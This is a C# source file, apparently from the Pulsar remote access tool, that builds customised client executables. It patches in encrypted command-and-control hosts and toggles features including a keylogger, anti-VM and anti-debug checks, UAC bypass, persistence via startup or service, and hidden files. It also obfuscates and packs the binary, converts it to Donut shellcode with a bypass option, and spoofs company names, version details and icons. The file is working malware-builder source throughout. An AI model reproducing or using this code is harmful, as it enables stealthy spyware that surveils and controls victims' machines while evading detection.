using Mono.Cecil;
using Mono.Cecil.Cil;
using Pulsar.Common.Cryptography;
using Pulsar.Server.Helper;
using Pulsar.Server.Models;
using System;
using System.IO;
using System.Security.Cryptography;
using System.Security.Cryptography.X509Certificates;
using System.Text;
using Vestris.ResourceLib;

namespace Pulsar.Server.Build
{
    /// <summary>
    /// Provides methods used to create a custom client executable.
    /// </summary>
    public class ClientBuilder
    {
        private readonly BuildOptions _options;
        private readonly string _clientFilePath;

        public ClientBuilder(BuildOptions options, string clientFilePath)
        {
            _options = options ?? throw new ArgumentNullException(nameof(options));
            _clientFilePath = clientFilePath ?? throw new ArgumentNullException(nameof(clientFilePath));
        }

        /// <summary>
        /// Builds a client executable. Validation errors throw; false preserves
        /// the caller's existing success convention.
        /// </summary>
        public bool Build(bool obfuscateBuild, bool packBuild)
        {
            Prepare(false);
            byte[] buffer;
            string certificateThumbprint;
            string entryPoint;

            using (var asmDef = AssemblyDefinition.ReadAssembly(_clientFilePath))
            {
                certificateThumbprint = WriteSettings(asmDef);
                RenameAssembly(asmDef);
                buffer = WriteAssembly(asmDef);
            }

            buffer = Transform(buffer, obfuscateBuild, packBuild);
            entryPoint = GetEntryPointFromBytes(buffer);
            File.WriteAllBytes(Path.GetFullPath(_options.OutputPath), buffer);
            ApplyResources();
            ClientBuildManifest.Write(
                _options,
                Path.GetFullPath(_clientFilePath),
                certificateThumbprint,
                "managed-executable",
                entryPoint,
                obfuscateBuild,
                packBuild);

            return false;
        }

        public void BuildShellcode(bool obfuscateBuild, bool packBuild)
        {
            Prepare(true);
            var outputPath = Path.GetFullPath(_options.OutputPath);
            var intermediatePath = outputPath + ".payload.exe";
            string certificateThumbprint;
            string entryPoint;
            byte[] buffer;

            try
            {
                using (var asmDef = AssemblyDefinition.ReadAssembly(_clientFilePath))
                {
                    certificateThumbprint = WriteSettings(asmDef);
                    RenameAssembly(asmDef);
                    buffer = Transform(WriteAssembly(asmDef), obfuscateBuild, packBuild);
                    File.WriteAllBytes(intermediatePath, buffer);
                }

                entryPoint = GetEntryPointFromBytes(File.ReadAllBytes(intermediatePath));
                var donutPath = ResolveOptionalPath(
                    _options.DonutPath,
                    Path.Combine(GetServerDirectory(), "donut.exe"),
                    "Donut");

                ShellcodeBuilder.GenerateShellcode(
                    intermediatePath,
                    entryPoint.Substring(0, entryPoint.LastIndexOf('.')),
                    entryPoint.Substring(entryPoint.LastIndexOf('.') + 1),
                    outputPath,
                    false,
                    donutPath,
                    string.Empty,
                    EntropyLevel.RandomSymmetric,
                    Architecture.Both,
                    Format.Binary,
                    Headers.Overwrite,
                    _options.ShellcodeCompression,
                    _options.ShellcodeBypass);

                ClientBuildManifest.Write(
                    _options,
                    Path.GetFullPath(_clientFilePath),
                    certificateThumbprint,
                    "donut-shellcode",
                    entryPoint,
                    obfuscateBuild,
                    packBuild);
            }
            finally
            {
                if (File.Exists(intermediatePath))
                    File.Delete(intermediatePath);
            }
        }

        private void Prepare(bool shellcode)
        {
            BuildOptionsValidator.Validate(_options, shellcode);

            if (!File.Exists(_clientFilePath))
                throw new FileNotFoundException("Client template not found.", Path.GetFullPath(_clientFilePath));

            var outputPath = Path.GetFullPath(_options.OutputPath);
            var outputDirectory = Path.GetDirectoryName(outputPath);
            var serverDirectory = GetServerDirectory();

            if (string.Equals(outputDirectory, serverDirectory, StringComparison.OrdinalIgnoreCase))
                throw new InvalidOperationException(
                    "The output path cannot be in the same directory as the server executable.");

            if (string.Equals(outputPath, Path.GetFullPath(_clientFilePath), StringComparison.OrdinalIgnoreCase))
                throw new InvalidOperationException("The output path cannot replace the client template.");

            Directory.CreateDirectory(outputDirectory);
        }

        private string WriteSettings(AssemblyDefinition asmDef)
        {
            var certificatePath = ResolveOptionalPath(
                _options.CertificatePath,
                Settings.CertificatePath,
                "Certificate");

            using (var caCertificate = new X509Certificate2(
                       certificatePath,
                       string.Empty,
                       X509KeyStorageFlags.Exportable))
            using (var serverCertificate = new X509Certificate2(caCertificate.Export(X509ContentType.Cert)))
            {
                var key = serverCertificate.Thumbprint;
                var aes = new Aes256(key);
                byte[] signature;

                using (var csp = caCertificate.GetRSAPrivateKey())
                {
                    if (csp == null)
                        throw new CryptographicException("The configured certificate does not contain a private key.");

                    var hash = Sha256.ComputeHash(Encoding.UTF8.GetBytes(key));
                    signature = csp.SignHash(hash, HashAlgorithmName.SHA256, RSASignaturePadding.Pkcs1);
                }

                var slots = ClientSettingsLayout.GetInstructions(asmDef);
                var strings = new[]
                {
                    aes.Encrypt(_options.Version),
                    aes.Encrypt(_options.RawHosts),
                    aes.Encrypt(_options.InstallSub),
                    aes.Encrypt(_options.InstallName),
                    aes.Encrypt(_options.Mutex),
                    aes.Encrypt(_options.StartupName),
                    key,
                    aes.Encrypt(_options.Tag),
                    aes.Encrypt(_options.LogDirectoryName),
                    aes.Encrypt(Convert.ToBase64String(signature)),
                    aes.Encrypt(Convert.ToBase64String(serverCertificate.Export(X509ContentType.Cert)))
                };

                for (var i = 0; i < strings.Length; i++)
                    slots.Strings[i].Operand = strings[i];

                var booleans = new[]
                {
                    _options.Install,
                    _options.Startup,
                    _options.HideFile,
                    _options.Keylogger,
                    _options.HideLogDirectory,
                    _options.HideInstallSubdirectory,
                    _options.AntiVM,
                    _options.AntiDebug,
                    _options.Pastebin,
                    _options.UACBypass,
                    _options.CRITICALPROCESS,
                    _options.INSTALLSERVICE,
                    _options.SHOWCLIENTGUI
                };

                for (var i = 0; i < booleans.Length; i++)
                {
                    slots.Booleans[i].OpCode = BoolOpCode(booleans[i]);
                    slots.Booleans[i].Operand = null;
                }

                slots.Delay.Operand = _options.Delay;
                slots.SpecialFolder.Operand = GetSpecialFolder(_options.InstallPath);
                return serverCertificate.Thumbprint;
            }
        }

        private static void RenameAssembly(AssemblyDefinition asmDef)
        {
            var renamer = new Renamer(asmDef);
            if (!renamer.Perform())
                throw new InvalidOperationException("Renaming failed.");
        }

        private static MethodDefinition GetEntryPoint(AssemblyDefinition asmDef)
        {
            var entryPoint = asmDef.EntryPoint;
            if (entryPoint == null || entryPoint.DeclaringType == null)
                throw new InvalidOperationException("Client template has no managed entry point.");

            return entryPoint;
        }

        private static string FormatEntryPoint(MethodDefinition entryPoint) =>
            entryPoint.DeclaringType.FullName + "." + entryPoint.Name;

        private static string GetEntryPointFromBytes(byte[] assemblyBytes)
        {
            using (var stream = new MemoryStream(assemblyBytes))
            using (var asmDef = AssemblyDefinition.ReadAssembly(stream))
            {
                return FormatEntryPoint(GetEntryPoint(asmDef));
            }
        }

        private static byte[] WriteAssembly(AssemblyDefinition asmDef)
        {
            using (var stream = new MemoryStream())
            {
                asmDef.Write(stream);
                return stream.ToArray();
            }
        }

        private static byte[] Transform(byte[] buffer, bool obfuscateBuild, bool packBuild)
        {
            if (obfuscateBuild)
            {
                var obfuscator = new Obfuscator.Obfuscator(buffer);
                obfuscator.Obfuscate();
                buffer = obfuscator.Save();
            }

            if (packBuild)
            {
                var tinyLoader = new TinyLoader.TinyLoader(buffer);
                tinyLoader.Pack();
                buffer = tinyLoader.Save();
            }

            return buffer;
        }

        private void ApplyResources()
        {
            if (_options.AssemblyInformation != null)
            {
                var versionResource = new VersionResource();
                versionResource.LoadFrom(_options.OutputPath);

                versionResource.FileVersion = _options.AssemblyInformation[7];
                versionResource.ProductVersion = _options.AssemblyInformation[6];
                versionResource.Language = 0;

                var stringFileInfo = (StringFileInfo)versionResource["StringFileInfo"];
                stringFileInfo["CompanyName"] = _options.AssemblyInformation[2];
                stringFileInfo["FileDescription"] = _options.AssemblyInformation[1];
                stringFileInfo["ProductName"] = _options.AssemblyInformation[0];
                stringFileInfo["LegalCopyright"] = _options.AssemblyInformation[3];
                stringFileInfo["LegalTrademarks"] = _options.AssemblyInformation[4];
                stringFileInfo["ProductVersion"] = versionResource.ProductVersion;
                stringFileInfo["FileVersion"] = versionResource.FileVersion;
                stringFileInfo["Assembly Version"] = versionResource.ProductVersion;
                stringFileInfo["InternalName"] = _options.AssemblyInformation[5];
                stringFileInfo["OriginalFilename"] = _options.AssemblyInformation[5];

                versionResource.SaveTo(_options.OutputPath);
            }

            if (!string.IsNullOrEmpty(_options.IconPath))
            {
                var iconFile = new IconFile(_options.IconPath);
                var iconDirectoryResource = new IconDirectoryResource(iconFile);
                iconDirectoryResource.SaveTo(_options.OutputPath);
            }
        }

        private static string GetServerDirectory() =>
            Path.GetDirectoryName(Path.GetFullPath(System.Reflection.Assembly.GetExecutingAssembly().Location));

        private static string ResolveOptionalPath(string requestedPath, string fallbackPath, string name)
        {
            var path = string.IsNullOrWhiteSpace(requestedPath) ? fallbackPath : requestedPath;
            if (string.IsNullOrWhiteSpace(path) || !File.Exists(path))
                throw new FileNotFoundException($"{name} file not found.", path);
            return Path.GetFullPath(path);
        }

        private static OpCode BoolOpCode(bool value) => value ? OpCodes.Ldc_I4_1 : OpCodes.Ldc_I4_0;

        private static sbyte GetSpecialFolder(int installPath)
        {
            switch (installPath)
            {
                case 1:
                    return (sbyte)Environment.SpecialFolder.ApplicationData;
                case 2:
                    return (sbyte)Environment.SpecialFolder.ProgramFiles;
                case 3:
                    return (sbyte)Environment.SpecialFolder.System;
                default:
                    throw new ArgumentOutOfRangeException(nameof(installPath));
            }
        }
    }
}
